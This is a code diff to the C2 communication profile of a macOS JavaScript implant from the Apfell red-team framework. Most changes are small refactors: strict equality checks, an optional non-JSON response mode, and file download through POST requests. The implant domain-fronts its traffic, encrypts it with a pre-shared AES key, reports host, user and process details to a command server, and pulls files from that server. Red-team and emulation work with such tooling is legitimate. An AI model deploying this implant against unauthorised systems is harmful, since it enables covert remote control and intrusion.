@@ -14,12 +14,12 @@ class customC2 extends baseC2{
         this.host_header = "domain_front";
         this.jitter = callback_jitter;
         this.aes_psk = "AESPSK"; // base64 encoded key
-		if(this.aes_psk != ""){
+		if(this.aes_psk !== ""){
 		    this.parameters = $({"type": $.kSecAttrKeyTypeAES});
             this.raw_key = $.NSData.alloc.initWithBase64Encoding(this.aes_psk);
             this.cryptokey = $.SecKeyCreateFromData(this.parameters, this.raw_key, Ref());
 		}
-        this.using_key_exchange = "encrypted_exchange_check" == "T";
+        this.using_key_exchange = "encrypted_exchange_check" === "T";
         if(this.using_key_exchange){
             //lets us know if we can decrypt right away or not
             this.exchanging_keys = true;
@@ -125,9 +125,8 @@ class customC2 extends baseC2{
 	    var s = "abcdefghijklmnopqrstuvwxyz";
 	    return Array(size).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
 	}
-	getGetFilePath(id, cid){
-	    var temp = this.get_file_path.replace(this.id_field, id);
-	    temp = temp.replace(this.id_field, cid);
+	getGetFilePath(cid){
+	    var temp = this.get_file_path.replace(this.id_field, cid);
 	    return this.stringReplaceRandomizations(temp);
 	}
 	getNextTaskPath(id){
@@ -196,7 +195,7 @@ class customC2 extends baseC2{
 		//needs IP, PID, user, host, payload_type
 		//gets back a unique ID
 		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid, "os": os, "architecture": arch};
-		if(user == 'root'){info['integrity_level'] = 3;}
+		if(user === 'root'){info['integrity_level'] = 3;}
 		//calls htmlPostData(url,data) to actually checkin
 		//var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
 		//Encrypt our data
@@ -255,7 +254,7 @@ class customC2 extends baseC2{
 
 		return jsondata;
 	}
-	htmlPostData(urlEnding, sendData){
+	htmlPostData(urlEnding, sendData, json=true){
 	     var url = this.baseurl + urlEnding;
         //console.log(url);
         //encrypt our information before sending it
@@ -291,12 +290,21 @@ class customC2 extends baseC2{
 				    //we're not doing the initial key exchange
 				    if(this.aes_psk != ""){
 				        //if we do need to decrypt the response though, do that
-				        resp = ObjC.unwrap(this.decrypt_message(resp));
-                        var jsondata = JSON.parse(resp);
-                        return jsondata;
+                        if(json){
+                            resp = ObjC.unwrap(this.decrypt_message(resp));
+                            var jsondata = JSON.parse(resp);
+                            return jsondata;
+                        }else{
+                            return this.decrypt_message(resp);
+                        }
 				    }else{
                         //we don't need to decrypt it, so we can just parse and return it
-                        return JSON.parse(resp.js);
+                        if(json){
+                            return JSON.parse(resp.js);
+                        }else{
+                            return resp.js;
+                        }
+
 				    }
 
 				}
@@ -397,9 +405,10 @@ class customC2 extends baseC2{
 	}
 	upload(task, params){
 	    try{
-	        var url = this.getGetFilePath(params, apfell.id);
+	        var url = this.getGetFilePath(apfell.id);
 	        //var url = "api/v1.0/files/" + params;
-            var file_data = this.htmlGetData(this.baseurl + url);
+            let data = JSON.stringify({"file_id": params});
+            var file_data = this.htmlPostData( url, data, false);
             if(file_data === undefined){
                 throw "Got nothing from the Apfell server";
             }
